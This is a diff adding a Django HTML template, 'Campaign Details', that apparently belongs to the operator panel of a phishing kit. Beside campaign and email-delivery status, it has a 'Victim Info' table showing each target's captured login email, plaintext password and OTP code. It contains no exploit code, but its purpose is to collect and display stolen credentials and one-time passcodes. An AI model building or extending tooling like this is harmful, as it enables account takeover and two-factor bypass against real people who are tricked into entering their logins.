@@ -1,0 +1,99 @@
+{% extends 'base.html' %}
+
+{% block title %}Campaign Details{% endblock %}
+
+{% block content %}
+<div class="container py-5">
+    <div class="row justify-content-center">
+        <div class="col-lg-8">
+            <nav aria-label="breadcrumb" class="mb-4">
+                <ol class="breadcrumb">
+                    <li class="breadcrumb-item"><a href="{% url 'core:campaign_list' %}">Campaigns</a></li>
+                    <li class="breadcrumb-item active" aria-current="page">Campaign Details</li>
+                </ol>
+            </nav>
+
+            <div class="card shadow mb-4">
+                <div class="card-header bg-primary text-white d-flex justify-content-between align-items-center">
+                    <h3 class="mb-0">Campaign Details</h3>
+                    <span class="badge bg-light text-dark">ID: {{ campaign.id }}</span>
+                </div>
+                <div class="card-body">
+                    <div class="row mb-4">
+                        <div class="col-md-6">
+                            <h5>Basic Information</h5>
+                            <ul class="list-group list-group-flush">
+                                <li class="list-group-item d-flex justify-content-between px-0">
+                                    <span class="text-muted">Template:</span>
+                                    <span class="fw-bold">{{ campaign.email_template.get_type_display }}</span>
+                                </li>
+                                <li class="list-group-item d-flex justify-content-between px-0">
+                                    <span class="text-muted">Recipient:</span>
+                                    <span class="fw-bold">{{ campaign.recipient_email }}</span>
+                                </li>
+                                <li class="list-group-item d-flex justify-content-between px-0">
+                                    <span class="text-muted">Created:</span>
+                                    <span>{{ campaign.created_at|date:"F j, Y H:i" }}</span>
+                                </li>
+                            </ul>
+                        </div>
+                        <div class="col-md-6">
+                            <h5>Email State</h5>
+                            {% if email_event %}
+                                <ul class="list-group list-group-flush">
+                                    <li class="list-group-item d-flex justify-content-between px-0">
+                                        <span class="text-muted">Status:</span>
+                                        <span class="fw-bold">{{ email_event.event_type|title }}</span>
+                                    </li>
+                                    <li class="list-group-item d-flex justify-content-between px-0">
+                                        <span class="text-muted">Last Updated:</span>
+                                        <span>{{ email_event.timestamp|date:"F j, Y H:i" }}</span>
+                                    </li>
+                                    <li class="list-group-item d-flex justify-content-between px-0">
+                                        <span class="text-muted">Recipient:</span>
+                                        <span>{{ email_event.recipient }}</span>
+                                    </li>
+                                </ul>
+                            {% else %}
+                                <div class="alert alert-info">No email event recorded yet.</div>
+                            {% endif %}
+                        </div>
+                    </div>
+                    
+                    {% if victim_info %}
+                        <h5 class="mt-4 mb-3">Victim Info</h5>
+                        <div class="table-responsive">
+                            <table class="table table-striped border">
+                                <thead class="bg-light">
+                                    <tr>
+                                        <th>Email</th>
+                                        <th>Password</th>
+                                        <th>OTP</th>
+                                        <th>Time</th>
+                                    </tr>
+                                </thead>
+                                <tbody>
+                                    <tr>
+                                        <td>{{ victim_info.login_email }}</td>
+                                        <td>{{ victim_info.login_password }}</td>
+                                        <td>{{ victim_info.login_otp|default:"—" }}</td>
+                                        <td>{{ victim_info.created_at|date:"M d, Y H:i" }}</td>
+                                    </tr>
+                                </tbody>
+                            </table>
+                        </div>
+                    {% else %}
+                        <div class="alert alert-warning mt-4">
+                            <p class="mb-0">Victim info will be available when the victim responds.</p>
+                        </div>
+                    {% endif %}
+                    
+                    <div class="mt-4 text-end">
+                        <a href="{% url 'core:campaign_list' %}" class="btn btn-secondary">Back to List</a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
